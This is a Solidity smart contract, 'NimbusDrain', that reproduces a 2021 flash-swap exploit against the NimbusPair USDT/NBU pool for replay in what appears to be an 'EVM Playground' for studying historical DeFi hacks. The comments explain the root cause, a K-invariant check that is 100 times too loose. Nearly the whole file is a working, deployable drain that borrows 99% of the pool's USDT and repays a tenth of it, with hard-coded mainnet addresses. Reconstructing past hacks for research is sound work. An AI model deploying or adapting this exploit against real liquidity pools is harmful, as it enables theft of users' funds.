// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-09-Nimbus).
// The DeFiHackLabs PoC (test/Nimbus_exp.sol) runs the attack INLINE in the
// Foundry test contract — the flash-swap callback `NimbusCall` lives on the test
// itself (attacker = address(this)), so there is no standalone contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack
// (testExploit + NimbusCall) so the playground can deploy it and record run().
// Logic and constants are copied verbatim from the registry test.
//
// Root cause: NimbusPair.swap() enforces the constant-product (K) invariant with a
// broken scaling factor — balances are multiplied by 10000 (10000^2 = 10^8) while
// reserves stay at 1000^2 (= 10^6), a 100x mismatch. The K check is 100x too
// loose, so an attacker can flash-swap out ~99% of the pool and repay only ~1/10
// in the callback; the (gutted) invariant still passes.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    // USDT (TetherToken) is a non-standard ERC20 whose transfer returns NOTHING,
    // so it must be declared without a return value (mirrors the test's
    // IERC20Custom) — a `returns (bool)` interface reverts on USDT's empty return.
    function transfer(address, uint256) external;
}

interface INimbusPair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface INimbusCallee {
    function NimbusCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract NimbusDrain is INimbusCallee {
    address constant PAIR = 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1; // NimbusPair (USDT/NBU)
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7; // token0

    IERC20 constant usdt = IERC20(USDT);
    INimbusPair constant pair = INimbusPair(PAIR);

    // entrypoint — mirrors ContractTest.testExploit()
    function run() external {
        // size the take: 99% of the pair's USDT reserve
        uint256 amount = usdt.balanceOf(PAIR) * 99 / 100;
        // flash-swap USDT out, non-empty `data` triggers the NimbusCall callback
        pair.swap(amount, 0, address(this), abi.encodePacked(amount));
    }

    // flash-swap callback — mirrors ContractTest.NimbusCall()
    // The pair has already optimistically sent us the USDT; repay only amount0/10.
    // Because the K check is 100x too loose, this ~10% repayment still passes.
    function NimbusCall(address, uint256 amount0, uint256, bytes calldata) external {
        usdt.transfer(PAIR, amount0 / 10);
    }
}
